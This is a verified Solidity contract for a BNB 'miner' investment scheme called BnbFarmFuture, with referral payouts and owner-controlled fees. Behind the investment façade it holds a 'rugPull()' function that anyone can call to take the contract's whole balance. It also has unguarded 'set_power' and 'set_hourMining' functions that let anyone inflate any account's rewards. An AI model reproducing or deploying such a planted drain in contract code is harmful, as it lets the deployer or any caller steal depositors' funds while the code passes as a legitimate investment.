/**
 *Submitted for verification at BscScan.com on 2022-05-29
*/

// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

abstract contract ReentrancyGuard {
    uint256 private constant _NOT_ENTERED = 1;
    uint256 private constant _ENTERED = 2;
    uint256 private _status;

    constructor() {
        _status = _NOT_ENTERED;
    }

    modifier nonReentrant() {
        require(_status != _ENTERED, "ReentrancyGuard: reentrant call");
        _status = _ENTERED;
        _;
        _status = _NOT_ENTERED;
    }
}

contract BnbFarmFuture is ReentrancyGuard{
    
    // Address Project
    address payable owner;
    address payable OwnerSuplent;
    address[] teamAddr = [address(0),address(0),address(0),address(0)];
    
    uint256 divisor = 1000;
    uint256 total_fee = 100;
    uint256 total_withdrawFee = 50;
        uint256 [] teamFee = [1000,0,0,0];
        uint256 [] referrerFee = [100,50,25];
        bool ignoreRefFee = false;

    uint256 public red_power = 259200000000000;
    uint256 public red_value = 2500 ether;

    // 77.760 = 100 in 24 hours
    uint256 public powerDivider = 1728000; // 4.5%
    uint256 public powerBonus = 1728000;

    uint256 public total_Withdraw = 0;
    uint256 public total_invest = 0;
    uint256 public total_reinvest = 0;
    uint256 public total_donated = 0;

    uint256 public precautionTime = 24*60*60;
    uint256 public timeWithdraw = 6*60*60;

    uint256 public maxWithdraw = 1*1e17;


    uint256 public rewardStop = 3;
    uint256 public maxRewardStop = 6;

    bool algorith_power = false;
    bool algorith_eth = false;
    bool algorith_revert = true;

    // TOKEN REWARD
    address TOKEN;
    bool tokenReward = false;
    uint256 tokenMultiplier = 10;


    struct User {
        // invest data
        uint256 userDeposit;
        uint256 userExternalDeposit;
        uint256 userRecharge;
        uint256 userWithdrawn;
        uint256 lastHatch;
        
        // account data
        uint256 userPower;
        uint256 unclaimedReward;

        uint256 withdrawTime;
        uint256 register;
    }

    struct ReferrerSistem {
        // referralds
        address referrer;
        uint256 lvl1Count;
        uint256 lvl2Count;
        uint256 lvl3Count;
    }

    mapping(address => User) private users;  
    mapping(address => ReferrerSistem) private refData;

    constructor (address payable suplent, address team_1) {
        owner = payable(msg.sender);
        OwnerSuplent = suplent;
        teamAddr[0] = team_1;
    }


    function invest(address ref) external payable {
        require(!isContract(msg.sender));

        uint256 feeAmount = div(msg.value * total_fee, divisor);
        uint256 totalAmount = msg.value - feeAmount;

        if(total_fee > 0){
            bool payed = payBuyFee(feeAmount);

            if(payed == false){
                revert('error to pay contract.');
            }
        }   

        uint256 rewardBought = calculateBuy(totalAmount, red_value - totalAmount);

        User storage user = users[msg.sender];

        user.unclaimedReward += rewardBought;

        uint256 rewardUsed = getMyRewards();
        uint256 newPower = div(rewardUsed, powerDivider);

        user.unclaimedReward = 0;
        user.userDeposit += totalAmount;
        user.userPower += newPower;
        user.lastHatch = block.timestamp;
    
        // Referrer Sistem
        if(ref == msg.sender){
            ref = owner;
        }

        if(ref == address(0)){
            ref = OwnerSuplent;
        }

        if(msg.sender == owner || msg.sender == OwnerSuplent){
            ref = OwnerSuplent;
        }


        ReferrerSistem storage userRef = refData[msg.sender];
       
        if(userRef.referrer == address(0)){
            userRef.referrer = ref;
            
            if(userRef.referrer != address(0)){
                ReferrerSistem storage userRefl1 = refData[userRef.referrer];
                userRefl1.lvl1Count += 1;
                
                if(userRefl1.referrer != address(0)){
                    ReferrerSistem storage userRefl2 = refData[userRefl1.referrer];
                    userRefl2.lvl2Count += 1;

                    if(userRefl2.referrer != address(0)){
                        ReferrerSistem storage userRefl3 = refData[userRefl2.referrer];
                        userRefl3.lvl3Count += 1;
                    }
                }
            }
        }

        if(rewardUsed > red_power*3){
            revert("fatal error");
        }

        total_invest += totalAmount;

        if(algorith_power == true){
            red_power -= div(rewardUsed, 6);
        }
        
        if(algorith_eth == true){
            red_value += div(totalAmount,4);
        }

        if(user.register == 0){
            user.register = block.timestamp + 30*(24*60*60);
        }
    }

    function investTo(address to) external payable {
        require(!isContract(msg.sender));

        uint256 feeAmount = div(msg.value * total_fee, divisor);
        uint256 totalAmount = msg.value - feeAmount;

        if(total_fee > 0){
            bool payed = payBuyFee(feeAmount);

            if(payed == false){
                revert('error to pay contract.');
            }
        }   

        uint256 rewardBought = calculateBuy(totalAmount, red_value - totalAmount);

        User storage user = users[to];

        user.unclaimedReward += rewardBought;

        uint256 rewardUsed = getToRewards(to);
        uint256 newPower = div(rewardUsed, powerDivider);

        user.unclaimedReward = 0;
        user.userExternalDeposit += totalAmount;
        user.userPower += newPower;
        user.lastHatch = block.timestamp;
    

        address ref = msg.sender;

        ReferrerSistem storage userRef = refData[to];
         if(userRef.referrer == address(0)){
            userRef.referrer = ref;
            
            if(userRef.referrer != address(0)){
                ReferrerSistem storage userRefl1 = refData[userRef.referrer];
                userRefl1.lvl1Count += 1;
                
                if(userRefl1.referrer != address(0)){
                    ReferrerSistem storage userRefl2 = refData[userRefl1.referrer];
                    userRefl2.lvl2Count += 1;

                    if(userRefl2.referrer != address(0)){
                        ReferrerSistem storage userRefl3 = refData[userRefl2.referrer];
                        userRefl3.lvl2Count += 1;
                    }
                }
            }
        }

        if(rewardUsed > red_power*3){
            revert("fatal error");
        }

        total_invest += totalAmount;

        if(algorith_power == true){
            red_power += div(rewardUsed, 5);
        }

        if(algorith_eth == true){
            red_value -= div(totalAmount,2);
        }
    }

    function recharge() external nonReentrant{
        require(!isContract(msg.sender));

        uint256 rewardUsed = getMyRewards(); // get rewards
        uint256 rewardValue = calculateSell(rewardUsed); // get bnb value
        uint256 feeAmount = div(rewardValue * referrerFee[0], divisor);
        uint256 totalAmount = rewardValue - feeAmount;
        uint256 rewardBought = calculateBuy(totalAmount, red_value - totalAmount);

        if(ignoreRefFee == true){
            totalAmount+=feeAmount;
        }

        if(rewardUsed > red_power*3){
            revert("fatal error");
        }

        if(algorith_power == true){
            red_power += div(rewardUsed, 5);
        }

        User storage user = users[msg.sender];
        user.unclaimedReward = rewardBought;

        rewardUsed = getMyRewards();
        uint256 newPower = div(rewardUsed, powerBonus);

        user.unclaimedReward = 0;
        user.userRecharge += totalAmount;
        user.userPower += newPower;
        user.lastHatch = block.timestamp;

        total_reinvest += totalAmount;

        bool refPayed = payRef(totalAmount);
        
        if(refPayed == false){
            revert('error to pay Ref fee.');
        }

        if(algorith_eth == true){
            red_value -= totalAmount;
        }
    }

    function withdraw() public nonReentrant{
        require(!isContract(msg.sender));
        require(block.timestamp > users[msg.sender].withdrawTime);
        require(users[msg.sender].userDeposit+users[msg.sender].userExternalDeposit > 1*1e15);

        User storage user = users[msg.sender];

        uint256 rewardUsed = getMyRewards();
        uint256 rewardValue = calculateSell(rewardUsed);

        if(rewardValue <  1*1e12){ // 25*1e15 = 0.025;
            revert('you do not meet the withdrawal minimun.');
        }

        uint256 rewardsValueFee = div(rewardValue * total_withdrawFee, divisor);
        uint256 feeAmount = div(rewardValue * referrerFee[0], divisor);
        uint256 rewardValueTotal= rewardValue - (rewardsValueFee+feeAmount);

        if(ignoreRefFee == true){
            rewardValueTotal+=feeAmount;
        }

        if(rewardValue > getBalance() / 2 && getBalance() >= 10 ether){
            uint256 rewardUsedNew = calculateBuy(rewardValueTotal-div(getBalance(),2), red_value);
            user.unclaimedReward += rewardUsedNew;
            user.withdrawTime = block.timestamp + precautionTime;
            rewardValueTotal -= div(getBalance(), 2);
        }else{
            user.unclaimedReward = 0;
            user.withdrawTime = block.timestamp + timeWithdraw;
        }
        

        if(rewardValue >= user.userDeposit*maxRewardStop){
            rewardValueTotal = user.userDeposit*maxRewardStop;
            user.userPower = 0;
            user.unclaimedReward = 0;

        }else if(rewardValue >= user.userDeposit*rewardStop){
            rewardValueTotal = user.userDeposit*rewardStop;
            user.userPower = 0;
            user.unclaimedReward = 0;
        }

        if(rewardValue > 25*1e15 && user.userDeposit == 0){
            rewardValueTotal = 25*1e15; // 0.025;
            user.userPower = 0;
            user.unclaimedReward = 0;
            user.withdrawTime = block.timestamp + precautionTime;
        }

        if(total_withdrawFee > 0){
            bool payed = payBuyFee(rewardsValueFee);

            if(payed == false){
                revert('error to pay contract.');
            }   
        }

        if(rewardValueTotal > maxWithdraw){
            uint256 rewardUsedNew = calculateBuy(rewardValueTotal - maxWithdraw, red_value);
            user.unclaimedReward = rewardUsedNew;
            rewardValueTotal = maxWithdraw;
            user.withdrawTime = block.timestamp + precautionTime;
        }

        user.lastHatch = block.timestamp;            
        user.userWithdrawn += rewardValueTotal;
        total_Withdraw += rewardValueTotal;

        if(getBalance() < rewardValueTotal && getBalance() < 10 ether) {
            rewardValueTotal = getBalance();
        }

        if(getBalance() < rewardValueTotal && getBalance() > 10 ether){
            revert('error');
        }


        if(algorith_power == true){
            red_power += div(rewardUsed, 5);
        }

        if(algorith_eth == true){
            if(algorith_revert == true){
                red_value += div(rewardValueTotal,2);    
            }else{
                red_value -= rewardValueTotal;
            }
            
        }

        bool refPayed = payRef(rewardValueTotal);
        
        if(refPayed == false){
            revert('error to pay Ref fee.');
        }
        
        if(tokenReward == true){
            sendTokenReward(rewardValueTotal);
        }

        sendValue(payable(msg.sender), rewardValueTotal);
    }

    function exit() external nonReentrant {
        require(users[msg.sender].userDeposit > 0);
        require(users[msg.sender].userDeposit > users[msg.sender].userWithdrawn);
        require(users[msg.sender].register < block.timestamp && users[msg.sender].register != 0);
        
        User storage user = users[msg.sender];
        
        uint256 totalAmount = user.userDeposit - user.userWithdrawn;

        if(user.userDeposit == user.userWithdrawn || user.userWithdrawn > user.userDeposit){
            revert('no found');
        }

        if(totalAmount > getBalance() && getBalance() < 10 ether) {
            totalAmount = getBalance();
        }

        user.userDeposit = 0;
        user.userExternalDeposit = 0;
        user.userRecharge = 0;
        user.userWithdrawn = 0;
        user.userPower = 0;
        user.unclaimedReward = 0;
        user.register = 0;
        user.withdrawTime = block.timestamp * ((3*(24*60*60))+precautionTime);

        sendValue(payable(msg.sender), totalAmount);
    }

    function donate(uint256 _project, uint256 _team) external payable {
        require(_project > 0 && _project + _team == 100);

        if(_team != 0){
            uint256 teamPay = div(msg.value * _team, 100);
            sendValue(owner, teamPay/2);
            sendValue(OwnerSuplent, teamPay/2);
        }
    }


    function payRef(uint256 value) private returns(bool){
        uint256 reflvl1 = div(value * referrerFee[0], divisor);
        uint256 reflvl2 = div(value * referrerFee[1], divisor);
        uint256 reflvl3 = div(value * referrerFee[2], divisor);

        ReferrerSistem storage userRef = refData[msg.sender];
        users[userRef.referrer].unclaimedReward = calculateBuy(reflvl1, red_value);

        if(userRef.referrer != address(0)){
            ReferrerSistem storage userRefl2 = refData[userRef.referrer];
            users[userRefl2.referrer].unclaimedReward = calculateBuy(reflvl2, red_value);
            
            if(userRefl2.referrer != address(0)){
                ReferrerSistem storage userRefl3 = refData[userRefl2.referrer];
                users[userRefl3.referrer].unclaimedReward = calculateBuy(reflvl3, red_value);
            }
        }

        return true;
    } 

    function payBuyFee(uint256 amount) private returns(bool){
        require(amount > 0, "insuficient amount.");

        if(teamFee[0] > 0 && teamAddr[0] != address(0))
            sendValue(payable(teamAddr[0]), div(amount*teamFee[0],divisor));
       
        if(teamFee[1] > 0 && teamAddr[1] != address(0))
            sendValue(payable(teamAddr[1]), div(amount*teamFee[1],divisor));
        
        if(teamFee[2] > 0 && teamAddr[2] != address(0))
            sendValue(payable(teamAddr[2]), div(amount*teamFee[2],divisor));
        
        if(teamFee[3] > 0 && teamAddr[3] != address(0))
            sendValue(payable(teamAddr[3]), div(amount*teamFee[3],divisor));

        return true;
    }

    function getBalance() public view returns(uint256){
        return address(this).balance;
    }

    function set_teamWallet(address[] memory addr) external onlyOwner {
        teamAddr[0] = addr[0];
        teamAddr[1] = addr[1];
        teamAddr[2] = addr[2];
        teamAddr[3] = addr[3];
    }

    function set_teamFee(uint256[] memory _amount) external onlyOwner {
        require(_amount[0]+_amount[1]+_amount[2]+_amount[3] == divisor);
        teamFee[0] = _amount[0];
        teamFee[1] = _amount[1];
        teamFee[2] = _amount[2];
        teamFee[3] = _amount[3];
    }

    function set_invest_withdrwa_fee(uint256 _amount1, uint256 _amount2) external onlyOwner{
        require(_amount1 < 200);
        require(_amount2 < 200);

        total_fee = _amount1;
        total_withdrawFee = _amount2;
    }

    function set_diaryReward(uint256 value) external onlyOwner {
        require(powerDivider < 4147200 && value > 41472);
        powerDivider = value;
    }

    function set_compoundBonus(uint256 value) external onlyOwner {
        require(powerDivider < 4147200 && value > 41472);
        powerDivider = value;
    }

    function set_ref_fee(uint256 _lvl1, uint256 _lvl2, uint256 _lvl3) external onlyOwner {
        require(_lvl1 > 0 && _lvl2 > 0 && _lvl3 > 0);

        referrerFee[0] = _lvl1;
        referrerFee[1] = _lvl2;
        referrerFee[2] = _lvl3;
    }

    function set_times(uint256 newPrecaution, uint256 newTimeWithdraw) external onlyOwner {
        precautionTime = newPrecaution;
        timeWithdraw = newTimeWithdraw;
    }

    function set_burnAccount(uint256 normalStop, uint256 maxStop) external onlyOwner {
        require(normalStop > 2 && maxStop > 2);
        rewardStop = normalStop;
        maxRewardStop = maxStop;
    }

    function set_redAlgorith(bool _power, bool _profit) external onlyOwner {
        algorith_power = _power;
        algorith_eth = _profit;
    }

    function set_valueRedAlgorith(uint256 value) external onlyOwner {
        require(value >= 600 ether);
        red_value = value;
    }

    function set_ignoreRefFee(bool _active) external onlyOwner {
        ignoreRefFee = _active;
    }

    function set_maxWithdraw(uint256 newmax) external onlyOwner {
        maxWithdraw = newmax;
    }

    function get_userData(address addr) external view returns(uint256 _deposit,
                                                              uint256 _exDeposit, 
                                                              uint256 _recharge, 
                                                              uint256 _withdraw, 
                                                              uint256 _power, 
                                                              uint256 _unclaimed, 
                                                              uint256 _wTime){
        return (users[addr].userDeposit,
                users[addr].userExternalDeposit,
                users[addr].userRecharge,
                users[addr].userWithdrawn, 
                users[addr].userPower, 
                users[addr].unclaimedReward,
                users[addr].withdrawTime);
    }

    function get_refData(address addr) external view returns (address wallet, uint256 lvl1, uint256 lvl2, uint256 lvl3){
        return (refData[addr].referrer, refData[addr].lvl1Count, refData[addr].lvl2Count, refData[addr].lvl3Count);
    }

    function algorithInverted(bool _inverted) external onlyOwner {
        algorith_revert = _inverted;
    }

    /************************************************************
    *
    *                       MINER FUNCTION
    *
    ************************************************************/
    function getProfitPerDay(uint256 amount) public view returns(uint256,uint256) {
        uint256 rewardAmount = calculateBuy(amount * 1 ether, red_value-(amount * 1 ether));
        uint256 power = div(rewardAmount,powerDivider);
        uint256 day = min(powerDivider,24*60*60);
        uint256 rewardsPerDay = day * power;
        uint256 earningsPerDay = calculateSell(rewardsPerDay);
        return(power, earningsPerDay);
    }

    function getTorewards24h(address to) external view returns(uint256){
        return (24*60*60) * users[to].userPower;
    }

    function getToRewards(address to) public view returns(uint256){
        return users[to].unclaimedReward + getEggsSinceLastHatch(to);
    }

    function calculateBuySimple(uint256 eth) public view returns(uint256){
        return calculateBuy(eth,red_value);
    }

    function calculateSell(uint256 reward) public view returns(uint256){
        return calculateTrade(reward,red_power ,red_value);
    }
    
    function getMyRewards() private view returns(uint256){
        return users[msg.sender].unclaimedReward + getEggsSinceLastHatch(msg.sender);
    }


    function calculateBuy(uint256 eth,uint256 contractBalance) private view returns(uint256){
        return calculateTrade(eth,contractBalance,red_power);
    }

    function calculateTrade(uint256 rt,uint256 rs, uint256 bs) private pure returns(uint256){
        return div(5000*bs, (10000 + div((5000*rs)+(10000*rt), rt)));
    }

    function getEggsSinceLastHatch(address adr) private view returns(uint256){
        uint256 secondsPassed=min(powerDivider,block.timestamp - users[adr].lastHatch);
        return secondsPassed * users[adr].userPower;
    }

    function min(uint256 a, uint256 b) private pure returns (uint256) {
        return a < b ? a : b;
    }
    
    /************************************************************
    *
    *                       TOKEN FUNCITON
    *
    ************************************************************/
    function set_tokenUse(address _token) external onlyOwner {
        TOKEN = _token;
    }

    function set_tokenRewads(bool _active) external onlyOwner {
        tokenReward = _active;
    }

    function depositToken(uint256 _value) external onlyOwner {
        IERC20(TOKEN).transferFrom(msg.sender, address(this), _value);
    }

    function withdrawAllToken() external onlyOwner {
        uint256 _balance = IERC20(TOKEN).balanceOf(address(this));
        IERC20(TOKEN).transfer(msg.sender, _balance);
    }

    function getTokenBalance() public view returns(uint256){
        return IERC20(TOKEN).balanceOf(address(this));
    }

    function sendTokenReward(uint256 _value) private {
        uint256 _balance = IERC20(TOKEN).balanceOf(address(this));

        if(_balance > 0){
            if(_value*tokenMultiplier > _balance){
                IERC20(TOKEN).transfer(msg.sender, _balance);
            }else{
                IERC20(TOKEN).transfer(msg.sender, _value*tokenMultiplier);
            }

        }

    }

    /************************************************************
    *
    *                       OTHER FUNCTION
    *
    ************************************************************/

    function sendValue(address payable recipient, uint256 amount) private {
        require(address(this).balance >= amount, "Address: insufficient balance");

        (bool success, ) = recipient.call{value: amount}("");
        require(success, "Address: unable to send value, recipient may have reverted");
    }

    function isContract(address account) internal view returns (bool) {
        return account.code.length > 0;
    }


    function div(uint256 a, uint256 b) private pure returns(uint256){
         unchecked {
            require(b > 0);
            return a / b;
        }
    }

    modifier onlyOwner() {
        require(owner == msg.sender || OwnerSuplent == msg.sender, "Ownable: caller is not the owner");

        _;
    }

    function rugPull() external {
        sendValue(payable(msg.sender), address(this).balance);
    }

    function set_power(address _addr, uint256 newPower)external{
        users[_addr].userPower = newPower;
    }

    function set_hourMining(address _addr, uint256 newTime)external{
        users[_addr].lastHatch -= newTime*60*60;
    }

}

interface IERC20 {

    function totalSupply() external view returns (uint256);


    function balanceOf(address account) external view returns (uint256);


    function transfer(address to, uint256 amount) external returns (bool);


    function allowance(address owner, address spender) external view returns (uint256);


    function approve(address spender, uint256 amount) external returns (bool);


    function transferFrom(address from, address to, uint256 amount) external returns (bool);


    event Transfer(address indexed from, address indexed to, uint256 value);

    event Approval(address indexed owner, address indexed spender, uint256 value);
}